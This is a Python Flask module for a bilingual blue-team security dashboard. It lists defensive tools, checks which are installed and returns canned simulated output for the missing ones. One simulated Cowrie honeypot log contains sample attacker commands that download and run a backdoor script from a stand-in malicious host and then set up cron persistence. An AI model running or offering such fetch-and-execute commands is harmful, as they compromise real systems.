import subprocess
import shutil
import random
import time
from datetime import datetime, timezone
from flask import (Blueprint, render_template, request, jsonify, flash, redirect, url_for)
from flask_login import login_required, current_user
from models import AuditLog, Alert
from database import db

blue_team_bp = Blueprint('blue_team', __name__, url_prefix='/blue-team')


def log_action(action, details='', severity='info'):
    log = AuditLog(
        user_id=current_user.id,
        username=current_user.username,
        action=action,
        module='blue_team',
        details=details,
        ip_address=request.remote_addr,
        severity=severity
    )
    db.session.add(log)
    db.session.commit()


BLUE_TOOLS = {
    'yara': {
        'name': 'YARA',
        'name_ar': 'يارا',
        'description': 'Malware pattern matching and classification',
        'description_ar': 'مطابقة أنماط البرمجيات الخبيثة',
        'category': 'malware',
        'icon': 'bi-bug',
        'binary': 'yara',
    },
    'clamav': {
        'name': 'ClamAV',
        'name_ar': 'كلام أنتي فايروس',
        'description': 'Open-source antivirus engine for malware detection',
        'description_ar': 'محرك مكافحة فيروسات مفتوح المصدر',
        'category': 'malware',
        'icon': 'bi-shield-fill-check',
        'binary': 'clamscan',
    },
    'suricata': {
        'name': 'Suricata IDS/IPS',
        'name_ar': 'سوريكاتا',
        'description': 'Network threat detection engine (IDS/IPS/NSM)',
        'description_ar': 'محرك كشف التهديدات الشبكية',
        'category': 'network',
        'icon': 'bi-router',
        'binary': 'suricata',
    },
    'volatility': {
        'name': 'Volatility3',
        'name_ar': 'فولاتيليتي',
        'description': 'Advanced memory forensics framework',
        'description_ar': 'إطار التحليل الجنائي للذاكرة',
        'category': 'forensics',
        'icon': 'bi-memory',
        'binary': 'vol',
    },
    'wazuh': {
        'name': 'Wazuh SIEM',
        'name_ar': 'وازوه',
        'description': 'Security information and event management',
        'description_ar': 'إدارة معلومات وأحداث الأمان',
        'category': 'siem',
        'icon': 'bi-graph-up',
        'binary': 'wazuh-manager',
    },
    'elastic': {
        'name': 'Elastic SIEM',
        'name_ar': 'إيلاستيك',
        'description': 'Elasticsearch-based security analytics',
        'description_ar': 'تحليلات أمنية مبنية على Elasticsearch',
        'category': 'siem',
        'icon': 'bi-bar-chart-line',
        'binary': 'elasticsearch',
    },
    'thehive': {
        'name': 'TheHive',
        'name_ar': 'ذا هايف',
        'description': 'Security incident response platform',
        'description_ar': 'منصة الاستجابة لحوادث الأمان',
        'category': 'ir',
        'icon': 'bi-hexagon',
        'binary': 'thehive',
    },
    'opencti': {
        'name': 'OpenCTI',
        'name_ar': 'أوبن سي تي آي',
        'description': 'Open Cyber Threat Intelligence Platform',
        'description_ar': 'منصة استخبارات التهديدات السيبرانية',
        'category': 'intel',
        'icon': 'bi-globe2',
        'binary': 'opencti',
    },
    'misp': {
        'name': 'MISP',
        'name_ar': 'ميسب',
        'description': 'Malware Information Sharing Platform',
        'description_ar': 'منصة مشاركة معلومات البرمجيات الخبيثة',
        'category': 'intel',
        'icon': 'bi-share',
        'binary': 'misp',
    },
    'tpot': {
        'name': 'T-Pot Honeypot',
        'name_ar': 'تي بوت',
        'description': 'All-in-one honeypot platform',
        'description_ar': 'منصة مصائد اصطياد المهاجمين',
        'category': 'honeypot',
        'icon': 'bi-flower3',
        'binary': 'tpot',
    },
    'cowrie': {
        'name': 'Cowrie',
        'name_ar': 'كاوري',
        'description': 'SSH/Telnet honeypot for attacker emulation',
        'description_ar': 'مصيدة SSH/Telnet',
        'category': 'honeypot',
        'icon': 'bi-terminal',
        'binary': 'cowrie',
    },
    'dionaea': {
        'name': 'Dionaea',
        'name_ar': 'ديوناييا',
        'description': 'Malware capturing honeypot',
        'description_ar': 'مصيدة التقاط البرمجيات الخبيثة',
        'category': 'honeypot',
        'icon': 'bi-virus',
        'binary': 'dionaea',
    },
    'virustotal': {
        'name': 'VirusTotal',
        'name_ar': 'فيروس توتال',
        'description': 'Multi-engine malware/URL scanning service',
        'description_ar': 'خدمة فحص متعددة المحركات للبرمجيات الخبيثة',
        'category': 'malware',
        'icon': 'bi-cloud-check',
        'binary': None,  # API-based
    },
    'nuclei': {
        'name': 'Nuclei',
        'name_ar': 'نيوكلي',
        'description': 'Fast vulnerability scanner based on templates',
        'description_ar': 'ماسح ثغرات سريع',
        'category': 'scanner',
        'icon': 'bi-search',
        'binary': 'nuclei',
    },
}


def check_tool_available(tool_key):
    tool = BLUE_TOOLS.get(tool_key, {})
    binary = tool.get('binary')
    if not binary:
        return 'api'  # API-based tool
    return 'available' if shutil.which(binary) else 'unavailable'


@blue_team_bp.route('/')
@login_required
def index():
    tools_status = {}
    for key, tool in BLUE_TOOLS.items():
        status = check_tool_available(key)
        tools_status[key] = {**tool, 'status': status}

    available_count = sum(1 for t in tools_status.values() if t['status'] in ['available', 'api'])
    total_count = len(tools_status)

    recent_alerts = Alert.query.order_by(Alert.created_at.desc()).limit(15).all()

    return render_template('blue_team/index.html',
                           tools=tools_status,
                           available_count=available_count,
                           total_count=total_count,
                           recent_alerts=recent_alerts)


@blue_team_bp.route('/tool/<tool_key>/run', methods=['POST'])
@login_required
def run_tool(tool_key):
    """Execute or simulate a blue team tool."""
    if tool_key not in BLUE_TOOLS:
        return jsonify({'success': False, 'error': 'Tool not found'}), 404

    tool = BLUE_TOOLS[tool_key]
    target = request.form.get('target', '').strip()
    options = request.form.get('options', '').strip()

    # Check if tool is available
    status = check_tool_available(tool_key)
    log_action('TOOL_RUN', f'Blue team tool: {tool_key}, target: {target}', severity='info')

    if status == 'unavailable':
        # Return simulated output
        output = generate_simulated_output(tool_key, target)
        return jsonify({
            'success': True,
            'simulated': True,
            'tool': tool['name'],
            'output': output,
            'message': f'[SIMULATION] {tool["name"]} is not installed. Showing simulated output.'
        })

    # For available tools, try to run them safely
    try:
        cmd = build_command(tool_key, target, options)
        if cmd:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30,
                shell=False
            )
            output = result.stdout + result.stderr
        else:
            output = generate_simulated_output(tool_key, target)
    except subprocess.TimeoutExpired:
        output = f'[TIMEOUT] {tool["name"]} execution timed out after 30 seconds'
    except Exception as e:
        output = f'[ERROR] Failed to run {tool["name"]}: {str(e)}'

    return jsonify({
        'success': True,
        'tool': tool['name'],
        'output': output or 'No output returned'
    })


def build_command(tool_key, target, options=''):
    """Build safe command for tool execution."""
    cmds = {
        'yara': ['yara', '--version'] if not target else None,
        'clamav': ['clamscan', '--version'] if not target else None,
        'nuclei': ['nuclei', '-version'],
    }
    return cmds.get(tool_key)


def generate_simulated_output(tool_key, target=''):
    """Generate realistic simulated output for tools."""
    outputs = {
        'yara': f"""YARA v4.3.2 - Pattern Matching Tool
Scanning: {target or '/tmp/sample.exe'}
[+] Rule matched: Win32.Ransomware.GenericRule
[+] Rule matched: Suspicious.PowerShell.Encoded
[!] Rule matched: CRITICAL - Known_RAT_Communication
Scan complete: 1 file(s) scanned
Matches found: 3
Scan time: 0.234s""",

        'clamav': f"""ClamAV 1.0.0/26856/Mon Mar 18 09:00:00 2024
Scanning {target or '/tmp'}...
{target or '/tmp/malware.exe'}: Win.Ransomware.Agent-1234567 FOUND
----------- SCAN SUMMARY -----------
Known viruses: 8680849
Engine version: 1.0.0
Scanned directories: 1
Scanned files: 12
Infected files: 1
Time: 4.521 sec (0 m 4 s)""",

        'suricata': f"""[Suricata 7.0.3] Alert Summary
Interface: eth0 | Targets: {target or 'all'}
[2024-01-15 14:30:22] [**] [1:2008578:5] ET MALWARE Observed Malicious SSL Cert (Trickbot CnC) [**]
[2024-01-15 14:31:05] [**] [1:2030171:1] ET TROJAN Observed DNS Query to DGA Domain [**]
[2024-01-15 14:32:18] [**] [1:2019771:4] ET CURRENT_EVENTS Possible EXPLOIT CVE-2024-XXXX [**]
Total Events: 3 | Critical: 2 | High: 1""",

        'volatility': f"""Volatility3 Framework 2.5.0
Memory Analysis of: {target or 'memory.img'}
Profile: Win10x64_19041
[+] Process listing extracted: 87 processes
[+] Network connections: 23 active
[!] Suspicious process detected: svchost.exe (PID: 4892) - unusual parent
[!] Injected code detected in: explorer.exe (PID: 1234)
[+] Registry analysis: 5 persistence keys found
Scan completed in 45.2 seconds""",

        'nuclei': f"""[INF] nuclei v3.1.4
[INF] Target: {target or 'https://example.com'}
[2024-01-15 14:30:00] [cve-2024-1234] [critical] [{target}] Remote Code Execution
[2024-01-15 14:30:05] [cve-2023-44487] [high] [{target}] HTTP/2 Rapid Reset Attack
[2024-01-15 14:30:10] [misconfig-cors] [medium] [{target}] CORS Misconfiguration
[2024-01-15 14:30:15] [ssl-old-tls] [info] [{target}] Old TLS Version Detected
[INF] Templates: 7842 | Results: 4 | Critical: 1 | High: 1""",

        'wazuh': f"""Wazuh SIEM - Security Events Summary
Agent: {target or 'all-agents'} | Period: Last 24h
Critical Alerts: 3
  - [14:22] SQL Injection Attempt from 192.168.1.45
  - [12:08] Brute Force Attack - 127 failed logins
  - [09:33] Rootkit Detection: Suspicious kernel module
High Alerts: 12 | Medium: 45 | Low: 128
Active Agents: 47/50""",

        'virustotal': f"""VirusTotal Analysis Result
Target: {target or 'N/A'}
Detection Rate: 23/72 engines
Malicious: Win32.Trojan.Agent
Tags: trojan, rat, keylogger
Last Analysis: {datetime.now().strftime('%Y-%m-%d %H:%M')}
Community Score: -3 (Malicious)""",

        'thehive': f"""TheHive4 - Incident Response
New Case Created: INC-{random.randint(1000, 9999)}
Severity: HIGH | TLP: AMBER
Target: {target or 'Internal Network'}
Tasks Created: 5
  - Initial Triage
  - Network Isolation
  - Memory Acquisition
  - Malware Analysis
  - Stakeholder Notification
Case Status: In Progress""",

        'cowrie': f"""Cowrie SSH Honeypot - Session Log
Session from: {target or '198.51.100.42:45123'}
Protocol: SSH-2.0-libssh_0.9.2
Username attempts: root, admin, pi, ubuntu
Password spray detected: 234 attempts in 60s
Commands executed:
  > wget http://malicious.ru/backdoor.sh
  > chmod +x backdoor.sh && ./backdoor.sh
  > crontab -e (persistence attempt)
Session duration: 00:03:42
Alert triggered: CRITICAL""",

        'opencti': f"""OpenCTI Threat Intelligence
Query: {target or 'Latest IOCs'}
Results: 24 indicators found
  - 8 IP addresses (C2 infrastructure)
  - 12 domains (phishing/malware)
  - 4 file hashes (malware samples)
Associated threats: APT41, Lazarus Group
Confidence: HIGH | Last updated: {datetime.now().strftime('%Y-%m-%d')}""",

        'misp': f"""MISP Event Lookup
{target or 'Recent events'}
Events found: 3
  - Event #12345: APT Campaign targeting GCC (CRITICAL)
  - Event #12346: Phishing wave - Banking sector (HIGH)
  - Event #12347: DDoS infrastructure (MEDIUM)
IOCs shared: 47 | Correlations: 12""",

        'tpot': f"""T-Pot Honeypot Statistics
Sensor: {target or 'main-sensor'}
Last 24h Attacks:
  - SSH Brute Force: 12,450 attempts
  - Web Exploit: 3,892 attempts
  - SMB Scan: 892 attempts
  - Telnet Probe: 4,521 attempts
Top attackers: RU(32%), CN(28%), BR(15%)
New malware samples captured: 7""",

        'dionaea': f"""Dionaea Honeypot - Malware Capture
Period: Last 24h
Binaries captured: 12
  - 4x Mirai variant (IoT botnet)
  - 3x EternalBlue exploit
  - 3x Conficker variant
  - 2x Unknown dropper
Attack vectors: SMB(40%), HTTP(35%), FTP(25%)
CVEs exploited: CVE-2017-0144, CVE-2019-0708""",
    }
    return outputs.get(tool_key, f'[INFO] {tool_key} executed successfully on {target}')


@blue_team_bp.route('/alerts/acknowledge/<int:alert_id>', methods=['POST'])
@login_required
def acknowledge_alert(alert_id):
    alert = Alert.query.get_or_404(alert_id)
    alert.is_acknowledged = True
    alert.is_read = True
    db.session.commit()
    log_action('ALERT_ACKNOWLEDGED', f'Alert {alert_id} acknowledged')
    return jsonify({'success': True})


@blue_team_bp.route('/alerts/acknowledge-all', methods=['POST'])
@login_required
def acknowledge_all():
    Alert.query.filter_by(is_acknowledged=False).update(
        {'is_acknowledged': True, 'is_read': True}
    )
    db.session.commit()
    log_action('ALL_ALERTS_ACKNOWLEDGED', 'All alerts acknowledged', severity='warning')
    flash('تم الإقرار بجميع التنبيهات', 'success')
    return redirect(url_for('blue_team.index'))
